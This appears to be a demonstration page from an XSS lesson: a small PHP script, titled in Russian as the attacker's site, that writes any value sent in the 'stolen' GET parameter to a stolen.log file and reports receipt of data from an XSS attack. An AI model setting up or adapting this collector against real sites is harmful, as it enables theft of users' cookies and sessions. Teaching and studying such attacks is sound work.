<!DOCTYPE html>
<html class="h-100" lang="ru-luna1918">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="HandheldFriendly" content="true">
    <meta name="MobileOptimized" content="0">
    <meta
        name="viewport"
        content="width=device-width, initial-scale=1, shrink-to-fit=no"
        >
    <title>Сайт злоумышленника</title>
    <link
        rel="stylesheet"
        href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
        integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
        crossorigin="anonymous"
        >
</head>
<body class="bg-danger h-100 text-white">
    <main class="container">
        <h1 class="text-center">Сайт злоумышленника</h1>
<?php
// Если методом GET передана переменная stolen...
if (isset($_GET['stolen'])) {
    // ...то записываем её значение в файл stolen.log.
    file_put_contents('stolen.log', "$_GET[stolen]\n", FILE_APPEND);
?>
        <p>Получен запрос, ставший результатом атаки <i lang="en">XSS</i>.</p>
        <p>
            Данные, полученные с запросом, внесены в файл
            <a class="text-white" href="stolen.log"><code>stolen.log</code></a>.
        </p>
<?php
}
?>
    </main>
</body>
</html>
